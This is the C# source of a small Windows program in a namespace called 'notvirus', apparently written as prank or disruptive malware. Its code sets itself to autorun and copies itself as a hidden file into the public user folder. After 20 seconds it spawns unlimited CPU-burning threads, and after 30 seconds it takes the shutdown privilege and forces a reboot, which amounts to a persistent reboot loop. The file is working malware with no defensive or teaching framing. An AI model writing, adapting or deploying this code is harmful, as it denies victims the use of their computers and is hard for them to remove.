using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace notvirus
{
    public partial class Form1 : Form
    {
        public static string needPatch = "C:\\Users\\Public\\";
        public Form1()
        {
            Autorun.SetAutorunValue(true, needPatch + "notvirus.exe"); // добавить в автозагрузку
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (!File.Exists(needPatch + "notvirus.exe"))
            {
                try
                {
                    File.Copy("notvirus.exe", needPatch + "notvirus.exe");
                    File.SetAttributes(needPatch + "notvirus.exe", FileAttributes.Hidden);
                }
                catch { }
            }

            start();
        }


        public static void sys_sleep()
        {
            while (true)
            {
                Thread s = new Thread(s_b);
                s.Start();
            }
        }
        private static void s_b()
        {
            int y = 2;
            while (true)
            {
                y *= y;
            }
        }


        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        internal struct TokPriv1Luid
        {
            public int Count;
            public long Luid;
            public int Attr;
        }
        [DllImport("kernel32.dll", ExactSpelling = true)]
        internal static extern IntPtr GetCurrentProcess();
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
        [DllImport("advapi32.dll", SetLastError = true)]
        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
        [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
        [DllImport("user32.dll", ExactSpelling = true, SetLastError = true)]
        internal static extern bool ExitWindowsEx(int flg, int rea);
        internal const int EWX_REBOOT = 0x00000002;
        public static Thread thread1;
        public static void DoExitWin(int flg)
        {
            const int SE_PRIVILEGE_ENABLED = 0x00000002;
            const int TOKEN_QUERY = 0x00000008;
            const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
            const string SE_SHUTDOWN_NAME = "SeShutdownPrivilege";

            bool ok;
            TokPriv1Luid tp;
            IntPtr hproc = GetCurrentProcess();
            IntPtr htok = IntPtr.Zero;
            ok = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);

            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;
            ok = LookupPrivilegeValue(null, SE_SHUTDOWN_NAME, ref tp.Luid);
            ok = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            ok = ExitWindowsEx(flg, 0);
        }


        public static void start()
        {
            Stopwatch sw = new Stopwatch();
            sw.Start();
            bool b = true;
            bool pl = false;
            while (b)
            {
                if (sw.ElapsedMilliseconds > 20000)
                {
                    if (!pl)
                    {
                        Thread g = new Thread(sys_sleep);
                        g.Start();
                        pl = true;
                    }
                }
                if (sw.ElapsedMilliseconds > 30000)
                {
                    DoExitWin(EWX_REBOOT);
                    b = false;
                }
            }
        }
    }
}